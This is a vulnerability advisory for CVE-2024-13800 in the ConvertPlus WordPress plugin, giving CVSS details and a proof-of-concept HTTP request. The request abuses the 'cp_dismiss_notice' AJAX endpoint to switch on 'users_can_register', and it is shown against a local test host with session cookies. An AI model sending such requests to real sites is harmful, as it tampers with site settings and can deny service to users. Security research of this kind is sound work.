# CVE-2024-13800
Popup Plugin For WordPress - ConvertPlus <= 3.5.30 - Missing Authorization to Authenticated (Subscriber+) Limited Options Update

# Description

The ConvertPlus plugin for WordPress is vulnerable to unauthorized modification of data that can lead to a denial of service due to a missing capability check on the 'cp_dismiss_notice' AJAX endpoint in all versions up to, and including, 3.5.30. This makes it possible for authenticated attackers, with Subscriber-level access and above, to update option values to '1' on the WordPress site. This can be leveraged to update an option that would create an error on the site and deny service to legitimate users or be used to set some values to true such as registration.

## Details

- **Type**: plugin
- **Slug**: convertplug
- **Affected Version**: 3.5.30
- **CVSS Score**: 8.1
- **CVSS Rating**: High
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
- **CVE**: CVE-2024-13800
- **Status**: Private

**Notes**

It only puts a 1 in the database so you can only put in a 1 in `users_can_register`


POC
---

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal:5555
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 50
Origin: http://kubernetes.docker.internal:5555
Connection: keep-alive
Referer: http://kubernetes.docker.internal:5555/wp-admin/options-general.php
Cookie: wordpress_c4ed56a3aa31dfaae2a50e9003068198=superadmin%7C1746784004%7CMdf7LiwOfluHufzihPiyUftZsNV1BU1vziFSwkdD7gT%7C8cb19a315a9569e77d5be2bf7555f178a9edba2afbc32d1499b8cfd5552e28b9; wp-settings-1=product_cat_tab%3Dpop%26libraryContent%3Dbrowse; wp-settings-time-1=1742893819; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_c4ed56a3aa31dfaae2a50e9003068198=superadmin%7C1746784004%7CMdf7LiwOfluHufzihPiyUftZsNV1BU1vziFSwkdD7gT%7Cf4d35f828e20c240ecf95e5940bddf55741adc8048977e60afd45a178c003011

action=cp_dismiss_notice&notice=users_can_register
```
